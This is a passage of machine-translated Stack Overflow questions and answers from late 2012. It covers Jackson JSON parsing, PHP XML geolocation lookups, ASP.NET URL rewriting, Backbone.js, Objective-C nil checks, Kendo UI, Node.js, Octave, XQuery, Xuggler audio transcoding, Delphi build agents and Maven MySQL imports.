                            subdata.put(subkey, new HashMap<String, Object>());
                            while (jsonParser.nextToken() != JsonToken.END_OBJECT) {
                                String subsubkey = jsonParser.getCurrentName();
                                jsonParser.nextToken();
                                Map<String, Object> subsubdata = (Map<String, Object>) subdata.get(subkey);
                                LogHelper.d("data[" + key + "][" + subkey + "][" + subsubkey + "]=" + jsonParser.getText());
                                subsubdata.put(subsubkey, jsonParser.getText());
                            }
                        }
                        else {
                            LogHelper.d("data[" + key + "]=" + jsonParser.getText());
                            mData.put(key, jsonParser.getText());
                        }
                    }
                }
                else {
                    LogHelper.d("data[" + key + "]=" + jsonParser.getText());
                    mData.put(key, jsonParser.getText());
                }
            }
        }
        else {
            LogHelper.d("status=" + jsonParser.getText());
            mStatus = jsonParser.getText();
        }
    }
}
catch (IllegalArgumentException e) {
    error("0", "IllegalArgumentException: " + e.getMessage());
}
catch (JsonParseException e) {
    error("0", "IOException: " + e.getMessage());
}
catch (IOException e) {
    error("0", "IOException: " + e.getMessage());
} 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-12-18T05:30:52.207

假设您的最终目标只是将 JSON 反序列化为 .Jackson`Map<String, Object>`有一种更简单的方法。使用`ObjectMapper`：

```
final String json = "{}";
final ObjectMapper mapper = new ObjectMapper();
final MapType type = mapper.getTypeFactory().constructMapType(
    Map.class, String.class, Object.class);
final Map<String, Object> data = mapper.readValue(json, type); 
```

您将需要错误处理等，但这是一个很好的起点。

# php - 从xml获取内容

> ID：13916089
> 
> 赞同：-4
> 
> 时间：2012-12-17T14:32:26.157
> 
> 标签：php, xml

我正在使用这个 Iplocator 来定位用户国家

[http://api.locatorhq.com/?user=Muhammad3241&key=c5018d1f3e2434e5277bc3143abbb41411f55834&ip=118.92.16.247&format=xml](http://api.locatorhq.com/?user=Muhammad3241&key=c5018d1f3e2434e5277bc3143abbb41411f55834&ip=118.92.16.247&format=xml)

我怎样才能只检索，以便我可以在 php 文件中使用它。

非常感谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T14:34:56.013

您可以使用 SimpleXML_Load_String() 将 XML 转换为对象，并使用 PHP 迭代器访问该对象。这显示了它是如何完成的。

见[http://www.laprbass.com/RAY_temp_atieh.php](http://www.laprbass.com/RAY_temp_atieh.php)

```
<?php // RAY_temp_atieh.php
error_reporting(E_ALL);

// ACQUIRE AN OBJECT REPRESENTATION OF THE DATA
$url = 'http://api.locatorhq.com/?user=Muhammad3241&key=c5018d1f3e2434e5277bc3143abbb41411f55834&ip=118.92.16.247&format=xml';
$xml = file_get_contents($url);
$obj = simplexml_load_string($xml);

// ACTIVATE THIS TO SHOW THE WHOLE OBJECT
// var_dump($obj);

// ACQUIRE THE COUNTRY
$c = (string)$obj->countryName;

var_dump($c); 
```

# asp.net - urlrewrite.net - 附加在 PostBack 上的真实查询字符串

> ID：13916092
> 
> 赞同：2
> 
> 时间：2012-12-17T14:32:32.063
> 
> 标签：asp.net, .net, url-rewriting, iis-6, rewrite

我正在使用 urlrewrite.net 来构建更友好的 url，并在我的 web.config 中有以下重写规则：

```
<if url="^/forsale/(.+)/(.+)/(.+)/(.+)/(.+)">
 <rewrite to="/aircraft/result.aspx?view=$2&amp;cat=$3&amp;loc=$4&amp;model=$5" />
</if> 
```

这意味着我现在可以浏览到： [http ://www.mydomain.com/dept/manufacturer/,734,,810,,159,,163,,,,,,,,/1/999999/false](http://www.mydomain.com/dept/manufacturer/,734,,810,,159,,163,,,,,,,,/1/999999/false)

查看实际网址： [http ://www.mydomain.com/folder/result.apsx?view=,734,,810,,159,,163,,,,,,,,/1/999999/false ?view=,734,,810,,159,,163,,,,,,,,&cat=1&loc=999999&model=false](http://www.mydomain.com/folder/result.apsx?view=,734,,810,,159,,163,,,,,,,,/1/999999/false?view=,734,,810,,159,,163,,,,,,,,&cat=1&loc=999999&model=false)

这工作正常，直到我触发任何类型的 PostBack 事件（按钮单击等），此时真实页面的查询字符串被添加到重写 url 的末尾，例如：

[http://www.mydomain.com/dept/manufacturer/,734,,810,,159,,163,,,,,,,,/1/999999/false?view=,734,,810,,159 ,,163,,,,,,,,&cat=1&loc=999999&model=false](http://www.mydomain.com/dept/manufacturer/,734,,810,,159,,163,,,,,,,,/1/999999/false?view=,734,,810,,159,,163,,,,,,,,&cat=1&loc=999999&model=false)

任何帮助/建议/答案将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-17T14:54:55.923

.NET Framework 3.5 SP1 中的 ASP.NET 提供了一种非常简单的方法来解决这个问题。现在，您可以使用名为 Action 的 HtmlForm 类的属性将回发 URL 设置为在任何重写发生之前浏览器请求的 URL。在 ASP.NET 中，您可以使用 HttpRequest.RawUrl 属性获取该 URL。因此，要在使用 URL 重写模块时修复 Web 表单的回发 URL，您需要将以下代码添加到页面：

```
protected void Page_Load(object sender, EventArgs e)  
{  
    form1.Action = Request.RawUrl;  
} 
```

在这里查看详细信息：

[ASP.NET 回发和 URL 重写](http://ruslany.net/2008/10/aspnet-postbacks-and-url-rewriting/)

另外，请检查：

**使用 URL 重写处理 ASP.NET 回发**：

在 ASP.NET 2.0 中，您可以使用一个更简洁的技巧来重写控件上的“action”属性。具体来说，您可以利用新的 ASP.NET 2.0 控件适配器扩展性体系结构来自定义控件的呈现，并用您提供的值覆盖其“操作”属性值。这不需要您更改 .aspx 页面中的任何代码。相反，只需将一个 .browser 文件添加到您的 /app_browsers 文件夹，该文件夹注册一个控制适配器类以用于输出新的“action”属性：

在这里查看详细信息：

[提示/技巧：使用 ASP.NET 重写 URL](http://weblogs.asp.net/scottgu/archive/2007/02/26/tip-trick-url-rewriting-with-asp-net.aspx)：

# javascript - 如何在 Backbone.js 的视图中获取模型属性？

> ID：13916095
> 
> 赞同：4
> 
> 时间：2012-12-17T14:32:45.140
> 
> 标签：javascript, rest, backbone.js

我正在尝试将模型作为参数传递给视图。我在视图中获取我的对象，但无法访问它的属性......这是代码：

从路由器：

```
var Product = new ProductModel({id: id});
Product.fetch();
var product_view = new ProductView({el: $("#main-content"), model: Product}); 
```

从模型：

```
var ProductModel = Backbone.Model.extend({
urlRoot: 'http://192.168.1.200:8080/store/rest/product/'
}); 
```

从视图：

```
ProductView = Backbone.View.extend({
    initialize: function(){
        console.log(this.model);
        this.render();
    },
    render: function(){
        var options = {
            id: this.model.id,
            name: this.model.get('name'),
            publication_start_date: this.model.get('publication_start_date'),
            publication_end_date: this.model.get('publication_end_date'),
            description: this.model.get('description'),
            applis_more: this.model.get('applis_more')
        }
        var element = this.$el;
        var that = this;
        $.get('templates/product.html', function(data){
            var template = _.template(data, options);
            element.html(template);
        });
    }
}); 
```

这是“console.log”的结果：

```
child {attributes: Object, _escapedAttributes: Object, cid: "c1", changed: Object, _silent: Object…}
Competences: child
Editor: child
Hobbies: child
Opinions: child
_changing: false
_escapedAttributes: Object
_pending: Object
_previousAttributes: Object
_silent: Object
attributes: Object
createdDate: null
deletedDate: null
descriptionId: 0
galleryImage: null
id: 13
image: null
manufacturerId: 0
name: "sdf"
owner: 0
status: 0
thumbnail: null
titleId: 0
type: 1
uid: "fdsf"
updatedDate: null
__proto__: Object
changed: Object
cid: "c1"
id: 13
__proto__: ctor 
```

在我看来，我所有的选择都是“未定义的”（姓名、日期……）

知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T14:53:40.080

创建初始模型后，您将立即使用

```
var product_view = new ProductView({..., model: Product}); 
```

在 的`initialize`方法中`ProductView`，您正在调用`this.render()`，它依次从模型中读取和呈现值 - 这些值中的大多数是`undefined`（因为服务器没有足够的时间发回模型的值）。
不要`this.render()`直接调用，而是绑定一个事件，例如：

```
// in ProductView::initialize
this.model.on('sync', function() {
    this.render();
}, this); 
```

您可能还想绑定`change`事件，以便模型的本地（尚未同步）更改也反映在视图中。（可以在[此处](http://backbonejs.org/#Events-catalog)找到 Backbone 事件的概述。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T20:34:10.843

因为 Product.fetch() 是异步发生的，所以一旦从服务器检索到数据，您就需要创建视图：

```
var Product = new ProductModel({id: id});
var product_view;
Product.fetch().done(function() {
    product_view = new ProductView({el: $("#main-content"), model: Product});
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T14:53:22.123

Product.fetch() 是一个异步调用，所以我的猜测是当你初始化视图时获取还没有完成。您可能想要做的是使用 fetch 的成功 + 错误回调，以确保模型在渲染之前有数据

[http://backbonejs.org/#Model-fetch](http://backbonejs.org/#Model-fetch)

# objective-c - Apple 模板是否包含错误，因为它们转换为 BOOL？

> ID：13916102
> 
> 赞同：9
> 
> 时间：2012-12-17T14:33:20.553
> 
> 标签：objective-c, cocoa-touch, cocoa, boolean, null

根据[Mike Ash 的博客文章](http://www.mikeash.com/pyblog/friday-qa-2012-12-14-objective-c-pitfalls.html)，由于指针大于 BOOL，因此转换为 BOOL 的概率为 6%。正因为如此，他建议如果你正在检查一个对象是否存在，你应该检查 nil

```
if (self != nil) { 
```

而不是 Apple 模板所做的是

```
if (self) { 
```

Apple 的模板是否包含错误或是否有其他一些我不知道的语法糖？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-17T14:41:43.900

> 因为他们转换为 BOOL

不，他们没有。根本没有演员表演。然而，有一个表达式的评估作为一个逻辑值。在指针（which`nil`和`self`are）的情况下，`NULL`指针的计算结果为 false，其他任何结果为 true。这不是错误，只是一种简写方式，它是完全有效的 C.

关于为什么要对`NULL`or进行显式比较`nil`：在某些情况下，它可能更具可读性，特别是如果乍一看表达式的类型和范围并不明显。但是，在 Objective-C 和 Cocoa 中，在构造函数中执行此操作非常常见，任何有经验的程序员都会毫无问题地掌握它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-17T17:40:17.623

Objective-C 是基于 C 的，而在 C 中，`if`语句确实，也许令人惊讶的是，不对布尔值进行操作。

C 有一个类型的层次结构：

*   、`char`整数和枚举 ( `enum`) 类型是*整数类型*
*   `float`和是真正的`double`浮动*类型*`long double`
**   存在三种复数类型，与实浮点类型一起简称为*浮点类型**   整数类型和浮点类型组合形成*算术类型**   算术类型和指针类型形成*标量类型**

 *呸！

现在到`if`声明，它是以下形式之一：

```
if ( expression ) statement
if ( expression ) statement else statement 
```

where*表达式*必须是*任何标量类型*。如果表达式比较不等于 0，则执行第一个（或唯一）*语句*，如果表达式比较等于 0，则执行第二个（如果存在）*语句*。

所以：

```
if (self) ... 
```

和

```
if (self != nil) ... 
```

*结果*相同。

第一个表达式`self`是一些指针类型，它是一个*标量类型*，并且被比较为不等于指针类型的零（在代码中由 表示`nil`）。第二个表达式`self != nil`是一个*等式表达式*，并产生一个`0`或`1`类型`int`，它也是一个*标量类型*......

所以从技术上讲，第二种形式涉及一个`int`值的中间产生，但没有编译器实际上会产生一个（当然，除非你将表达式的结果分配给一个变量）。

*笔记：*

1.  有点奇怪`if ( sin( angle ) ) ...`是有效的......
2.  该`switch`语句对*整数类型*而不是*标量类型进行操作*

高温高压

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-17T14:43:33.140

不，如果指针不为零，这不会失败，它是安全的，唯一的区别是语法，我不会推荐一种或另一种方式，因为它们是相同的。您没有将 self 转换为 BOOL，您只是在检查 self 是否不同于零。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-17T15:17:56.217

**已编辑**
根据 Martin 的评论，我记录了错误的调试消息。一样的

这是一个简单的测试

```
NSString *str = nil;
// suppose our string points to a string object whose starting address is 0x4500
//I'm assigning it manually so that I can test
str = 0x4500;
NSLog(@"%d",str);
if (str) {
    NSLog(@"It's non-nil");
}
else {
    NSLog(@"It's nil");
}

if (str == nil) {
    NSLog(@"It's nil");
}
else {
    NSLog(@"It's non-nil");
} 
```

输出是：

```
It's non-nil
It's non-nil 
```*

# kendo-ui - JavaScript 中的 headerTemplate 而不是 Kendo-UI Grid 的 Wrapper

> ID：13916109
> 
> 赞同：1
> 
> 时间：2012-12-17T14:33:42.767
> 
> 标签：kendo-ui

我怎样才能用 javascript 编写这个而不是使用 MVC Wrapper？

```
@(Html.Kendo().Grid(Model.List)
      .Name("grid")
    .Columns(c => { 
        c.Bound(e => e.ID); 
        c.Bound(e => e.Nom).HeaderHtmlAttributes(new { colspan = 2 }); 
        c.Bound(e => e.Nb).HeaderHtmlAttributes(new { style= "display:none;" }); 
    })
) 
```

我从以下代码开始进行实验，我知道它与上面提到的属性不完全匹配，但是如何为剑道网格的 javascript 列设置 HeaderHtmlAttributes 和 Headertemplate？

```
$("div#kendogrid").kendoGrid({
        dataSource: dataSource,
        columns: [
             {
                 field: "ID",
                 title: "Nr Id",
                 headerTemplate: "sample template text col 1",
                 width: 100
             },
             {
                 field: "Nom",
                 headerAttributes: {
                     "class": "myHeader",
                     style: "text-align: right"
                 },
                 width: 200
             }
        ]
    }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:35:09.083

您是正确的，`HeaderHtmlAttributes`是使用指定[`columns.headerAttributes`](http://docs.kendoui.com/api/web/grid#columnsheaderattributes-object)的，并且等效于您的`HeaderTemplate`is [`columns.headerTemplate`](http://docs.kendoui.com/api/web/grid#columnsheadertemplate-string)。请参阅文档链接：

*   [http://docs.kendoui.c​​om/api/web/grid#columnsheaderattributes-object](http://docs.kendoui.com/api/web/grid#columnsheaderattributes-object)
*   [http://docs.kendoui.c​​om/api/web/grid#columnsheadertemplate-string](http://docs.kendoui.com/api/web/grid#columnsheadertemplate-string)

您的原始代码的翻译将是：

```
$("#kendogrid").kendoGrid({
    dataSource: dataSource,
    columns   : [
        {
            field: "ID"
        },
        {
            field           : "Nom",
            headerAttributes: {
                colspan: 2
            }
        },
        {
            field           : "Nb",
            headerAttributes: {
                style: "display:none"
            }
        }
    ]
}); 
```

# node.js - Nodejs TypeError：无法读取未定义的属性“chId”

> ID：13916113
> 
> 赞同：1
> 
> 时间：2012-12-17T14:33:57.370
> 
> 标签：node.js, chat

我有 Omegle 克隆聊天服务。在压力下，我的 nodejs（超过 150 个用户）崩溃并出现错误 "TypeError: Cannot read property 'chId' of undefined" 。

```
/home/kotka/randomi.fi/beta/varaserver2/channel.js:67
        f = this.channels[e].chId;
                      ^
TypeError: Cannot read property 'chId' of undefined
    at Channel.joinChannel (/home/kotka/randomi.fi/beta/varaserver2/channel.js:67:23)
    at Session.createSession (/home/kotka/randomi.fi/beta/varaserver2/session.js:21:23)
    at /home/kotka/randomi.fi/beta/varaserver2/path.js:1:268
    at Server.<anonymous> (/home/kotka/randomi.fi/beta/varaserver2/fu.js:43:3)
    at Server.emit (events.js:70:17)
    at HTTPParser.onIncoming (http.js:1610:12)
    at HTTPParser.parserOnHeadersComplete [as onHeadersComplete] (http.js:91:29)
    at Socket.ondata (http.js:1506:22)
    at TCP.onread (net.js:374:27) 
```

什么是问题，我该如何解决？

[channel.js 源码](http://pastebin.com/SnDUWrYi)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T21:44:05.207

尝试捕获异常

```
process.on('uncaughtException', function(err) {
console.error(err.stack);
}); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-17T15:03:01.903

This just means that `this.channels[e]` is **`undefined`** and does not have a `chId` attribute.

# matlab - 如何在 Octave/MatLab 中获取实际元素的行和列

> ID：13916114
> 
> 赞同：1
> 
> 时间：2012-12-17T14:33:59.303
> 
> 标签：matlab, octave

当我使用它时，我试图在矩阵中获取实际元素（indX）的行

```
matrix2 = matrix .* indX; 
```

假设 matrix = one(2,2)
我正在等待 matrix2 的这些值 [1 1; 2 2]

我可以为此使用“for”

```
[rows columns] = size(matrix)
    for (indX=0; indX<rows; indX++)
    matrix2(indX,:) = matrix(indX,:) .* indX;
endfor 
```

是否可以在不使用 "for" 的情况下获得 indX ？
如果是，我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T16:10:08.090

您可以使用`bsxfun`：

```
matrix2 = bsxfun(@times, (1:size(matrix,1))', matrix); %'
matrix =
 4     2
 3     3
 4     1
>> bsxfun(@times, (1:size(matrix,1))', matrix ), % '
ans =
 4     2
 6     6
12     3 
```

# xml - XQuery/eXist：获取特定属性的列表？

> ID：13916119
> 
> 赞同：1
> 
> 时间：2012-12-17T14:34:26.373
> 
> 标签：xml, xquery

我有以下 XML 文件：

```
<animals>
   <animal id="1" weight="56">Flipper</animal>
   <animal id="2" weight="230">Dumbo</animal>
   ...
</animals> 
```

而且我只想保留权重（所以它返回“56 230 ...”）。我试过这个请求：

```
//animal[@weight] 
```

但我仍然得到了整个 XML 内容......我也尝试过：

```
//animal/@weight 
```

我得到了这个错误：

> 错误 SENR0001：属性“权重”没有父元素

秘诀是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:07:36.133

看起来您的 XQuery 引擎希望返回一个或多个 XML 文档。因为属性节点不能出现在 XML 文档的根部，所以它很不高兴。

您可以尝试 (1) 编写查询以不返回属性节点，而只返回它们的值：

```
for $w in //animal/@weight
return string($w) 
```

如果您的引擎真的只想返回 XML 文档，那么 (1) 也不会让它开心。因此，您可以尝试 (2) 返回一系列 XML 元素：

```
for $w in //animal/@weight
return <weight>{$w}</weight> 
```

如果这不让*您*满意，您可以 (3) 将所需的字符串包装在 XML 包装器中：

```
<weights>
{ for $w in //animal/@weight return string($w) }
</weights> 
```

如果您希望每个都在单独的行上，（4）

```
<weights> { 
  "&#xA;", 
  for $w in //animal/@weight 
  return (string($w), "&#xA;")
} </weights> 
```

# ffmpeg - 使用 xuggler 对音频进行转码

> ID：13916123
> 
> 赞同：2
> 
> 时间：2012-12-17T14:34:44.207
> 
> 标签：ffmpeg, xuggle, xuggler

我正在尝试使用标题转换音频文件

```
Opening audio decoder: [pcm] Uncompressed PCM audio decoder
AUDIO: 44100 Hz, 2 ch, s16le, 1411.2 kbit/100.00% (ratio: 176400->176400)
Selected audio codec: [pcm] afm: pcm (Uncompressed PCM) 
```

我想将此文件转码为 mp3 格式。我有以下代码片段，但效果不佳。我使用[XUGGLER 代码片段编写了它，用于对音频和视频进行转码](http://www.brokenmill.com/2010/08/xuggler-rtmp-howto/)。

音频解码器是

```
 audioDecoder = IStreamCoder.make(IStreamCoder.Direction.DECODING, ICodec.findDecodingCodec(ICodec.ID.CODEC_ID_PCM_S16LE));
    audioDecoder.setSampleRate(44100);
    audioDecoder.setBitRate(176400);
    audioDecoder.setChannels(2);
    audioDecoder.setTimeBase(IRational.make(1,1000));
    if (audioDecoder.open(IMetaData.make(), IMetaData.make()) < 0)
        return false;
    return true; 
```

音频编码器是

```
 outContainer = IContainer.make();
    outContainerFormat = IContainerFormat.make();
    outContainerFormat.setOutputFormat("mp3", urlOut, null);
    int retVal = outContainer.open(urlOut, IContainer.Type.WRITE, outContainerFormat);
    if (retVal < 0) {
        System.out.println("Could not open output container");
        return false;
    }
    outAudioCoder = IStreamCoder.make(IStreamCoder.Direction.ENCODING, ICodec.findEncodingCodec(ICodec.ID.CODEC_ID_MP3));
    outAudioStream = outContainer.addNewStream(outAudioCoder);
    outAudioCoder.setSampleRate(new Integer(44100));
    outAudioCoder.setChannels(2);
    retVal = outAudioCoder.open(IMetaData.make(), IMetaData.make());
    if (retVal < 0) {
        System.out.println("Could not open audio coder");
        return false;
    }
    retVal = outContainer.writeHeader();
    if (retVal < 0) {
        System.out.println("Could not write output FLV header: ");
        return false;
    }
    return true; 
```

这是编码方法，我发送 32 字节的数据包进行转码

```
public void encode(byte[] audioFrame){
    //duration of 1 video frame
    long lastVideoPts = 0;

    IPacket packet_out = IPacket.make();
    int lastPos = 0;
    int lastPos_out = 0;

    IAudioSamples audioSamples = IAudioSamples.make(48000, audioDecoder.getChannels());
    IAudioSamples audioSamples_resampled = IAudioSamples.make(48000, audioDecoder.getChannels());

    //we always have 32 bytes/sample
    int pos = 0;
    int audioFrameLength = audioFrame.length;
    int audioFrameCnt = 1;
    iBuffer = IBuffer.make(null, audioFrame, 0, audioFrameLength);
    IPacket packet = IPacket.make(iBuffer);
    //packet.setKeyPacket(true);
    packet.setTimeBase(IRational.make(1,1000));
    packet.setDuration(20);
    packet.setDts(audioFrameCnt*20);
    packet.setPts(audioFrameCnt*20);
    packet.setStreamIndex(1);
    packet.setPosition(lastPos);
    lastPos+=audioFrameLength;
    int pksz = packet.getSize();
    packet.setComplete(true, pksz);
    /*
    * A packet can actually contain multiple samples
    */
    int offset = 0;
    int retVal;
    while(offset < packet.getSize())
    {
        int bytesDecoded = audioDecoder.decodeAudio(audioSamples, packet, offset);
        if (bytesDecoded < 0)
            throw new RuntimeException("got error decoding audio ");
        offset += bytesDecoded;
        if (audioSamples.isComplete())
        {
            int samplesConsumed = 0;
            while (samplesConsumed < audioSamples.getNumSamples()) {
                retVal = outAudioCoder.encodeAudio(packet_out, audioSamples, samplesConsumed);
                if (retVal <= 0)
                    throw new RuntimeException("Could not encode audio");
                samplesConsumed += retVal;
                if (packet_out.isComplete()) {
                    packet_out.setPosition(lastPos_out);
                    packet_out.setStreamIndex(1);
                    lastPos_out+=packet_out.getSize();
                    retVal = outContainer.writePacket(packet_out);
                    if(retVal < 0){
                        throw new RuntimeException("Could not write data packet");
                    }
                }
            }
        }

    }

} 
```

我得到一个输出文件，但它没有被播放。我对音频编码和采样的经验很少。提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-18T10:07:53.727

最后，我能够将 pcm 流转码为 mp3 流。

代码中有几个问题：

*   我试图只转码一件事，即音频，代码片段正在转码音频和视频，因此设置流索引时出现问题。

    ~~packet_out.setStreamIndex(1);~~ packet_out.setStreamIndex(0)

*   第二件事是计算[ffmpeg guid](http://www.codediesel.com/tutorial/ffmpeg-a-beginners-guide-part-1/)

    ```
    channel * bits * sampling rate = bit rate 
    ```

    这件事我最后算错了。

*   音频样本中的样本数取决于您的采样率。这在我的代码中是错误的。

注意：这是一个非常古老的代码

```
 byte[] data = new byte[418];

public void encode(byte[] audioFrame) {
    IPacket packet_out = IPacket.make();
    int lastPos_out = 0;

    IAudioSamples audioSamples = IAudioSamples.make(11025, audioDecoder.getChannels());
    //IAudioSamples audioSamples_resampled = IAudioSamples.make(48000, audioDecoder.getChannels());

    //we always have 32 bytes/sample
    int pos = 0;
    int audioFrameLength = audioFrame.length;
    int audioFrameCnt = 1;
    iBuffer = IBuffer.make(null, audioFrame, 0, audioFrameLength);
    IPacket packet = IPacket.make(iBuffer);
    //packet.setKeyPacket(true);
    packet.setTimeBase(IRational.make(1, 1000));
    packet.setStreamIndex(0);
    int pksz = packet.getSize();
    packet.setComplete(true, pksz);
   /*
    * A packet can actually contain multiple samples
    */
    int offset = 0;
    int retVal;
    while (offset < packet.getSize()) {
        int bytesDecoded = audioDecoder.decodeAudio(audioSamples, packet, offset);
        if (bytesDecoded < 0)
            throw new RuntimeException("got error decoding audio ");
        offset += bytesDecoded;
        if (audioSamples.isComplete()) {
            /*audioResampler.resample(audioSamples_resampled, audioSamples, audioSamples.getNumSamples());
            audioSamples_resampled.setPts(Global.NO_PTS);*/
            int samplesConsumed = 0;
            while (samplesConsumed < audioSamples.getNumSamples()) {
                retVal = outAudioCoder.encodeAudio(packet_out, audioSamples, samplesConsumed);
                if (retVal <= 0)
                    throw new RuntimeException("Could not encode audio");
                samplesConsumed += retVal;
                if (packet_out.isComplete()) {
                    packet_out.setPosition(lastPos_out);
                    packet_out.setStreamIndex(0);
                    lastPos_out += packet_out.getSize();
                    System.out.println("size" + packet_out.getSize());
                    packet_out.getByteBuffer().get(data,0,packet_out.getSize());
                    try {
                        fo.write(data);
                    } catch (IOException e) {
                        e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
                    }
                    packet_out.reset();
                    //retVal = outContainer.writePacket(packet_out);
                    if (retVal < 0) {
                        throw new RuntimeException("Could not write data packet");
                    }
                }
            }
        }
    }
} 
```

# .net - .Net Framework 4 上的可移植类库和 MVVM 支持

> ID：13916129
> 
> 赞同：3
> 
> 时间：2012-12-17T14:35:09.087
> 
> 标签：.net, mvvm, .net-4.0, portable-class-library

根据可移植类库的文档，可移植类库中的 ViewModel 支持在 .NET Framework 4 中不存在，但在 .NET Framework 4.5 中存在。不幸的是，这使得采用便携式类库成为一个棘手的提议，因为我们大约一半的客户仍在使用 XP，因此无法升级到 4.5。

有趣的是，必要的类（如[http://msdn.microsoft.com/en-us/library/gg597391(v=vs.100).aspx#sectionToggle3](http://msdn.microsoft.com/en-us/library/gg597391(v=vs.100).aspx#sectionToggle3)和[http://msdn.microsoft.com/en-中所述us/library/gg597391.aspx#mvvm](http://msdn.microsoft.com/en-us/library/gg597391.aspx#mvvm)）确实存在于 .NET Framework 4 中。据我所知，应该可以发送一个 System.Windows.dll 将类型转发到适当的 .NET Framework 4 dll，如果我放弃 INotifyDataError（以及随附的 DataErrorsChangedEventArgs）。

是否可以简单地使用 .NET Framework 4.5 附带的 System.Windows.dll，去除对 INotifyDataError 和 DataErrorsChangedEventArgs 的引用，在必要时将对 System.dll 的引用重定向到 PresentationCore.dll，然后引用该可重定向系统项目中的 .Windows.dll 注定要在 .NET Framework 4 上运行？或者如果项目偶然在 .NET Framework 4.5 上运行，我会遇到难以调试的阴影问题吗？

我希望这可能像[http://nuget.org/packages/Microsoft.Bcl一样可行](http://nuget.org/packages/Microsoft.Bcl)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-07T08:28:30.877

您是否注意到，如果您在目标机器上安装 .NET 4.0.3 运行时更新（特别是 PCL 中的目标 4.0.3），那么您可以在 .NET4（即 4.0.3）平台上使用具有附加功能的可移植库? 希望这可以帮助。

# delphi - Delphi 构建自动化的最小代理安装足迹是多少？

> ID：13916132
> 
> 赞同：9
> 
> 时间：2012-12-17T14:35:30.210
> 
> 标签：delphi, continuous-integration, delphi-xe3, build-server

在创建对给定源存储库或项目中的所有内容执行干净的版本控制检查和完整系统构建的构建服务器时，XE3 Win32/Win64 项目所需的最低 Delphi 安装空间是多少？（核心系统 - 不是第 3 方组件）

我宁愿拥有可以包含在存储库中的一小部分文件，而不是完整的 Delphi 安装。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-17T17:08:36.580

使用命令行编译器，您无需在远程代理计算机上安装 IDE。从正在运行的安装中，将子文件夹内容复制到远程代理中`\Bin`。`\Lib`

然后运行 ​​DCC32.exe 命令行编译器，将 DCC32.CFG 文件内容更改为指向所有需要的源代码路径。不要忘记为所有 .dcu 生成的文件设置一个临时文件夹，并指定一个 .exe 目标文件夹。

看

*   [如何在命令行上编译我的 delphi 项目？](https://stackoverflow.com/questions/1837830/how-do-i-compile-my-delphi-project-on-the-command-line)
*   以及[命令行编译器的官方文档](http://docwiki.embarcadero.com/RADStudio/XE3/en/DCC32.EXE,_the_Delphi_Command_Line_Compiler)。

*更新*：是的，我知道，MSBuild 是“官方方式”。但是对于构建代理，我发现使用命令行编译器是多么容易。这里的问题是关于构建 Delphi 应用程序的“最小足迹”。

使用 DCC32，无需安装，无需*重现与 IDE 中相同的布局*。构建环境不应该与 IDE 配置绑定，并且应该从我的实验中的任何开发人员特性“干净”。它应该从头开始构建，从源代码构建您的所有应用程序，运行单元测试并准备发布。我看到一些 .dcu 或 .bpl 污染了构建过程，花了几个小时才发现为什么没有考虑代码修改！

如果您需要一些复杂的构建过程，我总是喜欢编写一些 Delphi（或 python）的代码，从文本文件中读取配置，而不管构建代理运行在什么计算机上。在计算机上安装 Delphi 只是为了构建（尤其是最新版本）是一个 PITA，即使许可证允许您这样做，而命令行编译器可以安全且快速地安装/设置。只需复制文件，然后运行它们。如果您的构建代理是一个虚拟服务器（现在应该是这样），您的 IT 将很高兴不污染注册表。如果只是您的公司 IT 更喜欢 Delphi，因为它相对于其他框架的简洁性，那么它总是值得的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-06T02:55:46.053

找到了 D2006+D2007 的来源：

[https://delphi.fandom.com/wiki/Setting_up_a_Delphi_Build_Machine](https://delphi.fandom.com/wiki/Setting_up_a_Delphi_Build_Machine)

# mysql - Maven 似乎在 Linux 下截断 SQL 导入/曲解参数

> ID：13916137
> 
> 赞同：0
> 
> 时间：2012-12-17T14:35:43.877
> 
> 标签：mysql, linux, maven

我有一个 mavenized build (maven3)，它有一个加载 mySQL 数据库转储的模块。这在 Windows 下可以正常工作，但在 Linux 下不行。

使用 -X 开关运行 maven，它会生成以下输出：

```
[DEBUG] Using mysql at /usr/bin/mysql
[DEBUG] Command to execute: mysql -uMYUSER --password=**** -hlocalhost --quick --max_allowed_packet=16M --default-character-set=utf8 -e "source /this/path/to/my/database/dump/is/longer/than/70/characters/the_dump.sql"
[ERROR] ERROR 1102 (42000): Incorrect database name '/this/path/to/my/database/dump/is/longer/than/70/characters/the_dump.' 
```

如果我直接在命令行上运行调试输出，the_dump.sql 脚本工作正常。我的猜测是 Maven 没有正确识别参数，和/或截断它们（请注意，第二个参数在错误消息中被截断为 70 个字符）。我无法承受在 Windows 下构建失败 - 由于数据库脚本中的某些命令，它无法通过使用“<”管道将其传递到 mysql 来正确运行。

这是相关的 pom 片段：

```
<build>
    <resources>
        <resource>
            <directory>META-INF</directory>
            <targetPath>META-INF</targetPath>
        </resource>
        <resource>
            <directory>${dumps.target.dir}</directory>
        </resource>
    </resources>

    <plugins>
        <plugin>
            <groupId>my.maven.plugin</groupId>
            <artifactId>db-dumps-maven-plugin</artifactId>

            <configuration>
                <databasesToDump>${db.schemas.to.dump}</databasesToDump>
                <documentStoreFolder>${documentstore.location}</documentStoreFolder>
                <outputDirectory>${project.build.directory}/../${dumps.target.dir}</outputDirectory>
            </configuration>

            <executions>
                <execution>
                    <id>dump-database</id>
                    <phase>prepare-package</phase>
